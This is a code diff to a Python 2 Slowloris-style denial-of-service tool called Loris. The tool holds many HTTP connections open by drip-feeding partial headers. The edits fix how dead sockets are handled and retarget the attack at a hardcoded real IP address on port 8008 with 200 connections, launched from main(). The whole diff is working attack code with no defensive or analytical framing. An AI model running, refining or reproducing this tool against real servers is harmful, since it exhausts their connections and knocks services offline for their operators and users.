@@ -70,7 +70,7 @@ class Loris:
             time.sleep(i)
             message = "X-a: b\r\n"
             try:
-                sent = sock.send(message)
+                sock.send(message)
             except socket.error, e:
                 print "Timeout determined to be " + str(i - 1)
                 return i - 1
@@ -115,7 +115,7 @@ class Loris:
             """ Send data """
             for i in range(0, self.connectionsPerThread):
                 if working[i] is True:
-                    if sockets[i]:
+                    if sockets[i] is not None:
                         sock = sockets[i]
                         message = "X-a: b\r\n"
                         try:
@@ -123,13 +123,15 @@ class Loris:
                         except:
                             working[i] = False
                             self.activeConnections -= 1
+                    else:
+                        working[i] = False
             
             """ Sleep for timeout """
             print "Currently active connections: " + str(self.activeConnections)
             time.sleep(self.timeout)
 
 def main():
-    loris = Loris(addr = "54.235.164.48", port = 80, totalConnections = 200)
+    loris = Loris(addr = "54.235.164.48", port = 8008, totalConnections = 200)
     loris.initiateAttack()
 
 if __name__ == "__main__":
